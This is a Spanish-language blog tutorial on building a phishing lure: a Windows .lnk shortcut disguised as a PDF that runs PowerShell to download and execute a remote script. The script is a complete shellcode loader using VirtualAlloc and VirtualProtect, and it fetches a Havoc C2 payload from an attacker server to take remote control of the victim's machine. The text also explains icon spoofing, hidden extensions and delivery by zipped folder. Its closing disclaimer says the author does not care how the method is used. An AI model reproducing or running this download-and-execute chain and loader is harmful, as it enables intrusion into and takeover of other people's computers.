
## Introducción

Los atacantes son bastante creativos a la hora de conseguir acceso inicial. Debido a la evolución de la seguridad, conseguir acceso mediante ejecutables comunes (.exe) ha demostrado ser poco viable, políticas de control empresarial y antivirus agresivos han dejado (casi) muerta esta vía de entrada para la intrusión de sistemas. Aún así, los atacantes no se han quedado cortos, en este post exploraremos una de las vias más comunes explotadas _in the wild_, esto es; el abuso de los shortcuts en windows (.lnk) para ejecutar binarios arbitrarios. Demostraremos un ataque por etapas, con un falso PDF construido, donde al final conseguiremos control absoluto de la máquina víctima usando **Havoc** como C2 (el lector podrá usar el sistema que quiera, se escogió Havoc de forma arbitraria).
## Mucho texto bro, dame un resumen:

Usando archivos .lnk, le pondremos un icono PDF arbitrario. Como argumento al .lnk usaremos **powershell** para descargar de un servidor un script .ps1 (iwr) y ejecutarlo (iex). Este script descargará un payload de Havoc, lo asemblará en memoria y ejecutará, logrando crear un _beacon_ que nos conecté a la máquina. Opcionalmente podemos redirigir el contenido a un verdadero .pdf en disco, para no levantar sospechas.
## La travesía de ocultar tus intenciones

El objetivo es simple, hacer que un archivo pdf ejecute codigo arbitrario. La forma mas h4ck3r es encontrando una vulnerabilidad en el parser PDF que permita ejecutar código. Lastimosamente es poco práctico, necesitamos saber el software especifíco que el usuario usa para leer pdfs (de los cuales muchas veces es el navegador), encontrar una vulnerabilidad en ese software y craftear el payload específico. Este camino requiere de habilidades propias de un equipo (o individuo) avanzados, así que tendremos que ir por otra ruta: engañar al usuario usando las características de Windows.

Hablemos un poco de las extensiones de archivos. Windows usa las extensiones (.exe, .pdf, .png, .txt) para saber cómo interpretar un archivo.

Por defecto, Windows te oculta las extensiones, un usuario arbitrario puede habilitar la opción de observar las extensiones desde el explorador de archivos

![[Pasted image 20251113110247.png]]

Muchos usuarios ignoran esta opción; para ser honestos, la mayoría de usuarios de Windows no la tienen activada, no les podría importar menos ver las extensiones de sus archivos.

Esto crea una ruta bastante jugosa de ataque: nombrar tu `virus.exe` a `virus.jpg.exe`. El usuario verá la primera extensión `virus.jpg` y no podrá ver la verdadera extensión 

![[Pasted image 20251113110512.png]]
calc.exe renombrado a calc.jpg.exe

Aún así, hay usuarios que no son tan tontos. Y por algún motivo u otro tienen activada la opción de observar extensiones, estos usuarios van a atrapar muy facilmente el truco.

![[Pasted image 20251113110610.png]]
Ver extensiones habilitada

Imagina la cara de la persona cuando vea que lo intentaste hacer pasar por tonto.

Aún con esto activado, hay extensiones en windows que nunca son mostradas en la interfaz. Usaremos una de estas extensiones para explotar un sistema

Puedes ver todas las extensiones que existen por defecto en el sistema desde la llave de registro `HKEY_CLASSES_ROOT`, las llaves que contengan el valor `NeverShowExt` nunca mostrarán su extensión desde la interfaz. 

![[Pasted image 20251113112134.png]]
Valor `NeverShowExt` en la llave `lnkfile`

Practicamente se podría eliminar esta llave y de esta forma ver la extensión siempre. Pero esto es algo que nadie hace.

Es sencillo realizar un script para observar todas las extensiones que contienen este valor (entre ellas .lnk, .pif, .mad). Muchas de estas no son explotables, o tal vez si lo sean y solo se necesite un poco de investigación :p

Como hablar de todas las extensiones ocultas se sale del alcance del post, discutiremos una sola: los archivos de atajo (.lnk)

### Todos los caminos llevan a Roma

Si usas Windows, en tu escritorio lo más probable es que tengas archivos así:

![[Pasted image 20251113113006.png]]

Notas la flecha por debajo? Esto se le llama un "Atajo" (shortcut link en ingles), su función es redirigirte al archivo real, de esta forma puedes tener atajos en varias partes del sistema sin tener que copiar el mismo archivo. Bastante conveniente, verdad?

Revisemos las propiedades de este archivo, para saber qué hace.

![[Pasted image 20251113113223.png]]

En "Target", podemos ver el ejecutable exacto al que apunta, que en este caso es `"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"`

Al ejecutarlo, este atajo correrá lo que haya en su Target.

La estructura binaria del .lnk contiene mucha informacion del archivo en si, para detalles completos, la documentacion de Microsoft es una excelente fuente: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943

Los valores que nos importan son:

LINKTARGET_ID_LIST: Especifica la ubicacion del objetivo (a donde apunta el LNK)

RELATIVE_PATH: Es la ruta que se resuelve si LINKTARGET_IDLIST falla.

COMMAND_LINE_ARGUMENTS: Proporciona los argumentos para el objetivo

![[Pasted image 20251113113946.png]]

Para una guia mas profunda del .lnk (y metodos de explotacion), el post de palo alto es recomendada: https://unit42.paloaltonetworks.com/lnk-malware/

Ya una vez cubierta la cháchara binaria, vamos a irnos a lo que nos importa.

### Abusando de los redirectores

Ya sabemos que `Target` apunta al binario en especifico que debe correr el .lnk, así que la pregunta es, qué binario vamos a usar?

Podemos en la misma ruta de entrega poner un .exe y apuntar el .lnk a este .exe .... Pero esto va contra el propósito inicial: acceso inicial sin depender de .exes externos.

Entonces vamos a usar binarios legitimos de Windows, que se encuentran en todo sistema. A esta técnica se le llama `Living off the land`, y es ampliamente explotada por varios actores. Utilizar binarios legitimos nos hace pasar desapercibidos, pues es imposible que un Antivirus detecte un archivo del sistema como malicioso (aunque si puede detectar su uso basado en motores de comportamiento, pero eso es una charla para otro día)

Para una lista buena de lolbins (living off the land binaries) la siguiente pagina es un excelente recurso, el lector debe tener en cuenta que es un recurso mantenido por usuarios, por lo que puede no ser tan extensa: https://lolbas-project.github.io/#

El lolbin que usaremos será `powershell.exe`, detalles en qué es powershell se salen del alcance del post, tambien pudiesemos haber usado `mshta.exe` `forfiles.exe` `rundll32.exe` y un sin fin más, pero para hacer más sencilla la guía decidí no optar por estos.

Crearemos un .lnk y apuntaremos su target a powershell.exe

![[Pasted image 20251113115026.png]]
![[Pasted image 20251113115039.png]]

Le llamamos Archivo importante.pdf y lo guardamos, revisando las propiedades vemos que su target es powershell.exe (se mostrará la ruta completa, lo omití por brevedad)

![[Pasted image 20251113115017.png]]

Ya con esto tenemos nuestro .lnk apuntando a powershell, le damos doble click y se abrirá una consola powershell.exe

![[Pasted image 20251113115141.png]]

Excelente, ahora lo que necesitamos es el siguiente paso: ejecutar código arbitrario.

powershell tiene muchas opciones y podemos ser lo suficientemente creativos para ejecutar código de muchas maneras, es tarea del lector encontrar la ruta que más se adecúe a sus necesidades (y sigilo)

Para mantenerlo simple haremos el más clásico metodo de ataque, hacer una peticion a un servidor web (Invoke-WebRequest) que contenga un script powershell y ejecutarlo (Invoke-Expression)

Escribimos un archivo de powershell .ps1 con el contenido "Hello world" y abrimos un servidor web en python para servirlo:

![[Pasted image 20251113115549.png]]
![[Pasted image 20251113115608.png]]

Ahora solo tenemos que usar la IP de la maquina y pedir el archivo en /hello.ps1

![[Pasted image 20251113115700.png]]
`powershell.exe iwr http://192.168.1.187:8000/hello.ps1 | iex`

Usamos iwr (invoke-webrequest) para pedir el archivo hello.ps1 y redirigimos el contenido a iex (invoke-expression) para correr el codigo.

Probemos si funciona:
![[Pasted image 20251113115911.png]]

Excelente! Pero hay un problema... El icóno de powershell es extremadamente sospechoso, ninguna persona clickeará en un "Archivio Importante.pdf" con un ícono así, necesitamos cambiarlo.

Descargamos un icono .ico de pdf, y lo ponemos en la misma carpeta que el payload, y hacemos que apunte a él

![[Pasted image 20251113124006.png]]

Perfecto! Tambien renombramos a IMPORTANTE.pdf para darle un aura de urgencia. Ahora el unico problema es ese pdf.ico ahí suelto, podriamos ocultarlo y rezar que nuestra victima no tenga activada el observar archivos ocultos (el usuario común nunca lo tiene activado). Comprimimos la carpeta y la enviamos.

Ahora el siguiente paso es modificar el .ps1 para hacerlo ejecutar código mas interesante. El lector que sepa lo que hace ya podrá abandonar este post y continuar con sus actividades. Se continuará dando un ejemplo usando Havoc para generar el shellcode y controlar remotamente la máquina.

### Explotacion con Havoc

Pude haber usado metasploit, pero por qué use Havoc? Porque soy hater de Metasploit y me parece más bonito Havoc.

Este post no se trata de instalar Havoc ni configurar ningún servidor de explotación, esto es tarea del lector, a partir de aqui se asumirá que ya se tiene una infraestructura válida (tanto para servir el .ps1 como para servir el .bin) y un payload en shellcode.

Primero vamos a hacer el script powershell que se encargará de cargar y ejecutar el shellcode

```powershell
# 1. Obtener el payload
$buf = (New-Object Net.WebClient).DownloadData('http://192.168.1.187:8000/demon.bin')

# 2. Definir prototipos para usar las sfunciones kernel32
Add-Type -NameSpace Win32 -Name Funcs -MemberDefinition @'
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")] public static extern bool   VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
'@

# 3. Alocar memoria RW -> Copiar shellcode -> Cambiar a RX
$addr = [Win32.Funcs]::VirtualAlloc([IntPtr]::Zero, $buf.Length, 0x3000, 0x04)
[Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
$old = 0
[Win32.Funcs]::VirtualProtect($addr, $buf.Length, 0x20, [ref]$old) 

# 4. Delegar y correr
$runner = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($addr, [Action])
$runner.Invoke()
```

Este script obtiene el shellcode (que llamaremos demon.bin) y lo guarda en un buffer $buf

Se importan los tipos para las funciones VirtualAlloc y VirtualProtect que seran usadas para crear la memoria en el proceso.

VirtualAlloc se usa para reservar memoria, y con VirtualProtect cambiamos la memoria a ejecutable luego de copiar el buffer.

Con este script + el listener de havoc preparado, ya podemos ejecutar nuestro shellcode

![[Pasted image 20251113123204.png]]

Corremos en nuestra máquina el IMPORTANTE.pdf y esperamos la conexión:

![[Pasted image 20251113123446.png]]
Ya tenemos la conexión, intentamos ejecutar `whoami` para confirmarlo:

![[Pasted image 20251113123535.png]]

Pwned :)

### Disclaimer 

No me importa lo que hagas con esta información, pero por obligación legal, estoy forzado a decirte la obviedad de que no me hago responsable de nada de lo que hagas con esta información, es puramente por propositos informativos. Hackear es ilegal y para nerds.

